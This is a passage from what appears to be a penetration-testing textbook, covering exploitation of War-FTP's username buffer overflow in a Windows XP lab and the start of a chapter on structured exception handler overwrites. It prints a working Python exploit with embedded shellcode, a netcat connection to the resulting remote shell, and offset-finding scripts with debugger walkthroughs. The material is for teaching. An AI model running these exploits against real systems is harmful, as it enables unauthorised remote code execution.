"\xc0\xe3\xf7\x98\xba\xbd\xa4\x72\x2a\x3b\x87\x44\x2c\x44" +
"\xc2\x32\xd0\xf5\xbb\x02\xef\x3a\x2c\x83\x88\x26\xcc\x6c" +
"\x43\xe3\xfc\x26\xc9\x42\x95\xee\x98\xd6\xf8\x10\x77\x14" +
"\x05\x93\x7d\xe5\xf2\x8b\xf4\xe0\xbf\x0b\xe5\x98\xd0\xf9" +
"\x09\x0e\xd0\x2b")
buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff" + shellcode
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
A Stack-Based Buffer Overflow in Windows 399
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
Listing 17-9: Exploit with ESP moved out of the way
With ESP out of the way, and knowing that our shellcode won’t be cor-
rupted in the process of being decoded or executed, run the exploit again
and use Netcat on Kali Linux to connect to TCP port 4444 on the Windows
target, as shown here.
root@kali:~# nc 192.168.20.10 4444
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\Documents and Settings\Georgia\Desktop>
Sure enough, we now have a shell on the Windows target, as shown by
the Windows command prompt above.
summary
In this chapter we used our knowledge from Chapter 16 to exploit a real-
world vulnerable program: the War-FTP program with a buffer overflow
issue in the Username field. We crashed the program and located the return
address, and then, instead of hardcoding a memory address for the over-
written return address, we found a JMP ESP instruction in a loaded DLL. We
then filled the attacker-controlled ESP register with shellcode generated by
Msfvenom. Now we’ve managed to hijack control of a real program.
In the next chapter, we will look at another Windows exploitation tech-
nique, structured exception handler overwrites.
400 Chapter 17
18
struCtureD e xCePtion
HanDler oVerwrites
When something goes wrong and causes a program to
crash, it has caused an exception. Accessing an invalid
memory location is one type of exception a program
can encounter.
Windows systems use a method called structured exception handlers (SEH)
to deal with program exceptions as they arise. SEH are similar to try/catch
blocks in Java: Code is executed, and if something goes wrong, the function
stops executing and passes execution to SEH.
Each function can have its own SEH registration entry. An SEH registra-
tion record is eight bytes long, consisting of a pointer to the next SEH record
(NSEH) followed by the memory address of the exception handler, as illus-
trated in Figure 18-1. The list of all the SEH entries is the SEH chain.
pointer to the next SEH record
SEH handler
pointer to the next SEH record
SEH handler
FFFFFFFF
SEH handler
Figure 18-1: SEH structure
In many cases, an application uses only the operating system’s SEH
entry to handle exceptions. You are probably already familiar with this
usage; it puts up a message box with something like “Application X has
encountered a problem and needs to close.” However, programs can also
specify custom SEH entries. When an exception is encountered, execu-
tion will be passed to the SEH chain to look for an entry that can handle
the exception. To view the SEH chain for an application in Immunity
Debugger, go to View4SEH chain, as illustrated in Figure 18-2.
Figure 18-2: Viewing the SEH chain
402 Chapter 18
seh overwrite exploits
Now let’s look at using SEH entries to take control of a program. A natural
question when working through the War-FTP buffer overflow example in
Chapter 17 would be, Why are we limited to 607 bytes for our shellcode?
Why can’t we write an even longer attack string and create a payload that’s
as long as we like?
We’ll begin our exploration of SEH overwrites with the exploit we used
to crash War-FTP. Instead of the 1,100-byte exploit string that we used in
the example in Chapter 17, let’s try crashing War-FTP with a 1,150-byte
string of As, as shown in Listing 18-1.
root@kali:~# cat ftpexploit2
#!/usr/bin/python
import socket
buffer = "A" * 1150
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.close()
Listing 18-1: War-FTP exploit with 1,150 As
As shown in Figure 18-3, the program crashes as expected, but this
time our access violation is a bit different from the one in Chapter 17. EIP
points to 0x77C3F973, a valid instruction inside MSVCRT.dll. Instead of over-
writing the saved return pointer and crashing the program with EIP con-
trol, War-FTP crashed writing to memory address 0x00B00000.
Notice in the CPU pane that the instruction at 0x77C3F973 is MOV BYTE PTR
DS:[EAX], 0. Basically, the program is trying to write to the memory loca-
tion of the value of EAX. Looking at the top right of Immunity Debugger, the
Registers pane, we see EAX contains the value 00B00000. Something about our
attack string seems to have corrupted EAX, because the program is now try-
ing to write to a memory location that is not writable. Without EIP control,
is this crash still viable? Really long attack strings frequently cause an excep-
tion by trying to write data off the end of the stack.
Before we write off this exploit and move on, take a look at the SEH
chain. As shown in Figure 18-4, the structured exception handler has
been overwritten with As. Recall that in the event of a crash, execution
is passed to SEH. Though we were not able to control EIP directly at the
time of the crash, perhaps controlling SEH will allow us to still hijack
execution.
Structured Exception Handler Overwrites 403
Figure 18-3: A program crashes without EIP control.
Figure 18-4: SEH overwritten
Just as we used Mona to create a cyclic pattern to see which four bytes
overwrote the saved return pointer in the previous chapter, we will find
which four As are overwriting SEH using the command !mona pattern_create
1150 in Immunity Debugger, as shown in Figure 18-5.
404 Chapter 18
Figure 18-5: Generating a cyclic pattern with Mona
Copy the resulting pattern from C:\logs\war-ftpd\pattern.txt into the
exploit in place of the 1,150 As, as shown in Listing 18-2.
root@kali:~# cat ftpexploit2
#!/usr/bin/python
import socket
u buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2
Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8
Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4
Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0
Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6
Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2
Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8
Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au5Au6
Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2
Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8
Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4
Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0
Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6
Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2
Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2B"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.close()
Listing 18-2: Using pattern generation to pinpoint the SEH overwrite in the attack string
Structured Exception Handler Overwrites 405
Here we’ve generated a 1,150-character pattern and replaced the string
of As at u. Next, restart War-FTP in Immunity Debugger, and run the exploit
again. As shown in Figure 18-6, SEH is overwritten with 41317441.
Figure 18-6: SEH overwritten with Mona’s pattern
Now use !mona findmsp to find out where in our 1,150-character attack
string the SEH entry is overwritten, as shown in Figure 18-7.
Figure 18-7: Finding the SEH overwrite in the cyclic pattern
406 Chapter 18
Looking through the log output at C:\logs\war-ftpd\findmsp.txt, shown
in part here, we find that the NSEH entry is overwritten 569 bytes into the
attack string. Recall from Figure 18-1 that SEH chain entries are made up
of eight bytes (the NSEH entry followed by the SEH pointer). Thus our SEH
overwrite is at 573 bytes into our attack string (four bytes after NSEH).
[+] Examining SEH chain
SEH record (nseh field) at 0x00affd94 overwritten with normal pattern :
0x41317441 (offset 569), followed by 577 bytes of cyclic data
Passing Control to seh
Back on the Windows XP target, the bottom of the Immunity Debugger
screen shows the access violation and also notes that you can type shift-
F7/F8/F9 to pass an exception to the program. In this case, the program
will attempt to execute the memory address 41317441, the string that has
overwritten SEH. Use shift-F9 to run the program until the next error
occurs. As shown in Figure 18-8, the program receives an access violation
when attempting to access the memory address 41317441. As in the previous
examples, we will put a useful memory address in the place of 41317441 to
successfully hijack execution.
Also note in Figure 18-8 that when execution is passed to SEH, many
of our registers have been zeroed out. This might make jumping to an
attacker-controlled register more difficult.
Figure 18-8: Execution is passed to the overwritten SEH.
Structured Exception Handler Overwrites 407
Of the registers that have not been zeroed out, none appears to point
to a portion of our attack string. Clearly, a simple JMP ESP in SEH will not
work to redirect execution to attacker-controlled memory. Things are still
looking pretty bleak in our search for exploitability.
Finding the attack string in memory
Of course, in this case, we already have a working saved return pointer
overwrite exploit. However, some programs will be vulnerable only to SEH
overwrites, so developing a method to exploit these issues is of the utmost
importance. Luckily, an attacker-controlled memory address is on the hori-
zon for SEH overwrites. As shown in Figure 18-9, highlight the ESP register
in Immunity Debugger, right-click, and select Follow in Stack.
Figure 18-9: Following ESP on the stack
Though the contents of the ESP register do not point to any part of our
cyclic pattern, two steps down from ESP, at ESP+8, we see that memory address
00AFD94 points to our cyclic pattern in memory, as shown in Figure 18-10. If we
can find a way to remove two elements from the stack and then execute the
contents of this memory address, we can execute shellcode in place of
the pattern.
408 Chapter 18
Figure 18-10: Cyclic pattern eight bytes higher than ESP
The location of NSEH is 00AFFD94, as noted by the output of Mona’s
findmsp command. We can verify this by right-clicking 00AFFD94 in the stack
pane and clicking Follow in Stack, as shown in Figure 18-11.
Figure 18-11: Cyclic pattern in the pointer to the next SEH record
Structured Exception Handler Overwrites 409
As discussed earlier, SEH entries are eight-byte-long linked lists con-
sisting of a pointer to the next SEH record in the chain and the memory
address of the handler on the stack. If we can load ESP+8 into EIP, we can
execute some shellcode. Unfortunately, it looks like we have only four bytes
to work with before we hit the SEH entry itself, but let’s deal with one prob-
lem at a time. We need to find a viable way of getting to our shellcode, and
then we will return to making our shellcode fit into the space available.
Before we move on, let’s verify that our offsets are correct, as shown in
Listing 18-3.
#!/usr/bin/python
import socket
buffer = "A" * 569 + "B" * 4 + "C" * 4 + "D" * 573 u
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.close()
Listing 18-3: Verifying overwrite offsets
Edit your exploit program to send over 569 As, followed by 4 Bs, followed
by 4 Cs, and rounding out the 1,150 byte attack string with 573 Ds at u.
Restart War-FTP and run the exploit again. We see in Figure 18-12 that
SEH is overwritten by our 4 Cs.
Figure 18-12: SEH is overwritten by four Cs.
410 Chapter 18
If we again type shift-F9 to pass the exception handler to the crashed
program, War-FTP crashes a second time when accessing the memory
address 43434343, our Cs. Now follow the ESP register in the stack. As shown
in Figure 18-13, ESP+8 points to a memory address filled with the four Bs
followed by our four Cs and then the Ds.
Figure 18-13: ESP+8 is attacker controlled.
Our offsets are correct. Now to find a way to redirect execution to ESP+8.
Unfortunately, a simple JMP ESP won’t cut it this time.
PoP PoP ret
We need an instruction, or series of instructions, that will allow us to move
eight bytes down the stack and then execute the contents of the memory
address located at ESP+8. To figure out the assembly instructions we need,
we must consider how the stack works.
The stack is a last-in, first-out (LIFO) structure. The analogy of a stack
of trays in a cafeteria is often used for this concept. The last tray put on the
stack by cafeteria staff is the first one grabbed by a cafeteria patron. The
assembly command equivalents of the tray being added to the stack and
then picked up by a patron are PUSH and POP, respectively.
Recall that ESP points to the top (lowest memory address) of the cur-
rent stack frame. If we use the POP instruction to pop one entry (four bytes)
off the stack, ESP will now point to ESP+4. Thus, if we execute two POP
instructions in succession, ESP will now point to ESP+8, which is exactly
what we are going for.
Structured Exception Handler Overwrites 411
Finally, to redirect our execution to our attacker-controlled string,
we need to load the value of ESP+8 (now in ESP after our two POP instruc-
tions) into EIP (the next memory address to be executed). Luckily, there’s
an instruction for that, namely, the RET instruction. By design, RET takes the
contents of the ESP register and loads them into EIP to be executed next.
If we can find these three instructions, POP , POP , RET (often abbreviated by exploit developers as POP POP RET), we
should be able to redirect the program’s execution by overwriting SEH with
the memory address of the first POP instruction. The contents of ESP will
then be popped into the register indicated by the instruction. We don’t par-
ticularly care which register gets the honor of holding the popped-off data,
as long as it’s not ESP itself. We care only about burning things off the stack
until we get to ESP+8.
Next, the second POP instruction is executed. Now ESP points to the
original ESP+8. Then, the RET instruction is executed, and ESP (ESP+8
when the SEH was executed) is loaded into EIP. Recall from the previous
section that ESP+8 held a memory address that points to byte 569 of our
attacker-controlled string.
note As with JMP ESP, it is not a hard requirement that we find POP POP RET instructions.
Logical equivalents, such as adding eight bytes to ESP followed by a RET and others,